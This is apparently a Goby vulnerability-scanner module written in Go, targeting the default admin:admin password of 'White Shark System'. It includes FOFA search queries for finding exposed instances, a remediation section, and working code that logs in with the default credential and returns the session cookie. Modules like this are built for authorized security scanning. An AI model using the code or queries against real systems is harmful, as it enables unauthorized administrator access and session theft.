package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "White Shark System user_login.php default password vulnerability",
    "Description": "<p>The White Shark System is a management tool aimed at improving production efficiency and optimizing organizational processes. The system provides a series of functions to help users better manage their business and achieve higher performance.</p><p>The White Shark System has a default password of admin: admin, which allows attackers to control the entire platform using administrator privileges to operate core functions.</p>",
    "Product": "White-Shark-System",
    "Homepage": "https://gitee.com/keenlove/wss/",
    "DisclosureDate": "2023-03-31",
    "Author": "2075068490@qq.com",
    "FofaQuery": "body=\"wss_logo\" || body=\"wss_title\" || body=\"wss_ver\"",
    "GobyQuery": "body=\"wss_logo\" || body=\"wss_title\" || body=\"wss_ver\"",
    "Level": "2",
    "Impact": "<p>The White Shark System has a default password of admin: admin. Attackers can control the entire platform through default password vulnerabilities, using administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://blog.csdn.net/xiang1009/article/details/102784625"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.2",
    "Translation": {
        "CN": {
            "Name": "White Shark System user_login.php 默认口令漏洞",
            "Product": "White-Shark-System",
            "Description": "<p>White Shark System是一种旨在提高生产效率和优化组织流程的管理工具，该系统提供了一系列功能，以帮助用户更好地管理其业务并实现更高的绩效。</p><p>White Shark System 存在默认口令 admin:admin ，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>White Shark System 存在默认口令 admin:admin 。攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "White Shark System user_login.php default password vulnerability",
            "Product": "White-Shark-System",
            "Description": "<p>The White Shark System is a management tool aimed at improving production efficiency and optimizing organizational processes. The system provides a series of functions to help users better manage their business and achieve higher performance.</p><p>The White Shark System has a default password of admin: admin, which allows attackers to control the entire platform using administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>The White Shark System has a default password of admin: admin. Attackers can control the entire platform through default password vulnerabilities, using administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-11-21",
    "PocId": "10882"
}`
	sendLoginPayloadbbhj1231 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		loginRequestConfig := httpclient.NewPostRequestConfig("/user_login.php")
		loginRequestConfig.FollowRedirect = true
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		loginRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo)
		loginRequestConfig.Header.Store("HOST", hostInfo.FixedHostInfo)
		loginRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		loginRequestConfig.Data = "textfield=admin&textfield2=admin&button=%E7%99%BB%E5%BD%95"
		return httpclient.DoHttpRequest(hostInfo, loginRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendLoginPayloadbbhj1231(hostInfo)
			return resp != nil && strings.Contains(resp.Utf8Html, `nav_select`) && strings.Contains(resp.Utf8Html, `/index.php?doLogout=true`) && strings.Contains(resp.Utf8Html, `user_view.php?recordID`)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "login" {
				resp, err := sendLoginPayloadbbhj1231(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(resp.Utf8Html, `nav_select`) && strings.Contains(resp.Utf8Html, `/index.php?doLogout=true`) && strings.Contains(resp.Utf8Html, `user_view.php?recordID`) {
					expResult.Output = `Cookie: ` + resp.Request.Header.Get(`Cookie`)
					expResult.Success = true
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
